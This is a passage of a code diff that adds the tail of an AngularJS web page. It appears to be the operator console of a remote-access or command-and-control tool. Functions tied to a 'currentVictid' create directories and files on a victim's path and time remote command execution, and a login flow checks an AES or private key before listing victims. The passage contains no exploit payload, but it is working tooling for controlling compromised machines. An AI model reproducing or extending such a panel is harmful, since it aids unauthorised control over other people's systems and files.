+				$scope.timeElapsed = ( end - start )/1000;
+				$scope.cmdExu = false ;
+
+
+			})
+
+
+		}
+
+		$scope.makeDir = function(){
+			$http.post(apiLink , { action: "mkdir" , id : $scope.currentVictid, name : $scope.createdirname , path : $scope.path }).success(function(data) {
+				if(data.status==true){
+
+					$scope.changePath($scope.createdirname,1);
+					$scope.createdirname = "";
+				}
+				
+
+
+			})
+		}
+		$scope.makeFile = function(){
+
+			$http.post(apiLink , { action: "mkFile" , id : $scope.currentVictid, name : $scope.createfilename , path : $scope.path }).success(function(data) {
+				console.log(data);
+				if(data.status==true){
+
+					$scope.changePath($scope.createfilename,0);
+					$scope.createfilename = "";
+				}
+				
+
+
+			})
+		}
+		$scope.hideFiles = function(){
+			$scope.currentVict =  false ;
+		}
+		$scope.sendLogin = function(file){
+			$scope.error =  "";
+			$scope.send = true ;
+			$scope.key = encodeURI($scope.key);
+
+			var link = apiLink+"?action=signin&&key="+$scope.key;
+			
+		
+			file.upload = Upload.upload({
+				url: link ,
+				data: {username: $scope.username, file: file},
+			});
+
+			file.upload.then(function (data) {
+				$timeout(function () {
+					data = data.data;
+					if(data.status != true  ){
+					$scope.send = false ;
+					$scope.error =  "AES Key / Private Key Mismatch , please try again ";
+				}
+				else {
+					$scope.vict = data.data;
+					$scope.login = 8 ;
+					$scope.login1 = 2 ;
+
+
+				}
+					
+				});
+			}, function (response) {
+				if (response.status > 0)
+					$scope.errorMsg = response.status + ': ' + response.data;
+			}, function (evt) {
+      // Math.min is to fix IE which reports 200% sometimes
+      file.progress = Math.min(100, parseInt(100.0 * evt.loaded / evt.total));
+  });
+		}
+		$scope.sendLogin2 = function(){
+
+			if($scope.username.length < 2 || $scope.password.length < 2){
+				$scope.error ="Please put your Username & Password" ;
+				return false ;
+			}
+			$scope.error =  "";
+			$scope.send = true ;
+			$http.post(apiLink , { action: "login" , username : $scope.username , password : $scope.password  }).success(function(data) {console.log(data);
+				if(data.status != true  ){
+					$scope.send = false ;
+					$scope.error =  " Your username or password is invalid , please try again ";
+				}
+				else {
+					$scope.vict = data.data;
+					$scope.login = 8 ;
+					$scope.login1 = 2 ;
+
+
+				}
+
+			})
+		}
+
+
+	});
+app.directive('nagPrism', [function() {
+	return {
+		restrict: 'A',
+		scope: {
+			source: '@'
+		},
+		link: function(scope, element, attrs) {
+			scope.$watch('source', function(v) {
+				if(v) {
+					Prism.highlightElement(element.find("code")[0]);
+				}
+			});
+		},
+		template: "<code ng-bind='source'></code>"
+	};
+
+}]);
+</script> 
+</body>
+</html>
